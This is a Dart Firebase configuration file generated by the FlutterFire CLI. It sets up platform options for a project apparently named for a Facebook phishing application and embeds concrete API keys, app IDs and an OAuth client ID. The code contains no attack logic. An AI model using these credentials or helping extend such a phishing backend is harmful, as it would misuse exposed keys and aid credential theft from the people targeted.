// File generated by FlutterFire CLI.
// ignore_for_file: lines_longer_than_80_chars, avoid_classes_with_only_static_members
import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
import 'package:flutter/foundation.dart'
    show defaultTargetPlatform, kIsWeb, TargetPlatform;

/// Default [FirebaseOptions] for use with your Firebase apps.
///
/// Example:
/// ```dart
/// import 'firebase_options.dart';
/// // ...
/// await Firebase.initializeApp(
///   options: DefaultFirebaseOptions.currentPlatform,
/// );
/// ```
class DefaultFirebaseOptions {
  static FirebaseOptions get currentPlatform {
    if (kIsWeb) {
      return web;
    }
    switch (defaultTargetPlatform) {
      case TargetPlatform.android:
        return android;
      case TargetPlatform.iOS:
        return ios;
      case TargetPlatform.macOS:
        return macos;
      case TargetPlatform.windows:
        throw UnsupportedError(
          'DefaultFirebaseOptions have not been configured for windows - '
          'you can reconfigure this by running the FlutterFire CLI again.',
        );
      case TargetPlatform.linux:
        throw UnsupportedError(
          'DefaultFirebaseOptions have not been configured for linux - '
          'you can reconfigure this by running the FlutterFire CLI again.',
        );
      default:
        throw UnsupportedError(
          'DefaultFirebaseOptions are not supported for this platform.',
        );
    }
  }

  static const FirebaseOptions web = FirebaseOptions(
    apiKey: 'AIzaSyDP4CVBbqroQOfi1I1TW6DVunMZjvU7ieU',
    appId: '1:941630222457:web:8e689f3ac20bf1adefa4a8',
    messagingSenderId: '941630222457',
    projectId: 'facebook-aplication-phising',
    authDomain: 'facebook-aplication-phising.firebaseapp.com',
    storageBucket: 'facebook-aplication-phising.appspot.com',
  );

  static const FirebaseOptions android = FirebaseOptions(
    apiKey: 'AIzaSyCPoMznbG8y99mc2TkUTCjfu4pxVuux1wQ',
    appId: '1:941630222457:android:80465eb7a147a98cefa4a8',
    messagingSenderId: '941630222457',
    projectId: 'facebook-aplication-phising',
    storageBucket: 'facebook-aplication-phising.appspot.com',
  );

  static const FirebaseOptions ios = FirebaseOptions(
    apiKey: 'AIzaSyBzFiotNPfahlGfJ3lkwfj_2SmZ3vOEUgQ',
    appId: '1:941630222457:ios:e164f4bc7a5f7f88efa4a8',
    messagingSenderId: '941630222457',
    projectId: 'facebook-aplication-phising',
    storageBucket: 'facebook-aplication-phising.appspot.com',
    iosClientId: '941630222457-nhg3jgckv484bvfp9cjurgthre3e6lu9.apps.googleusercontent.com',
    iosBundleId: 'com.example.facebookAplicationPhishing',
  );

  static const FirebaseOptions macos = FirebaseOptions(
    apiKey: 'AIzaSyBzFiotNPfahlGfJ3lkwfj_2SmZ3vOEUgQ',
    appId: '1:941630222457:ios:e164f4bc7a5f7f88efa4a8',
    messagingSenderId: '941630222457',
    projectId: 'facebook-aplication-phising',
    storageBucket: 'facebook-aplication-phising.appspot.com',
    iosClientId: '941630222457-nhg3jgckv484bvfp9cjurgthre3e6lu9.apps.googleusercontent.com',
    iosBundleId: 'com.example.facebookAplicationPhishing',
  );
}
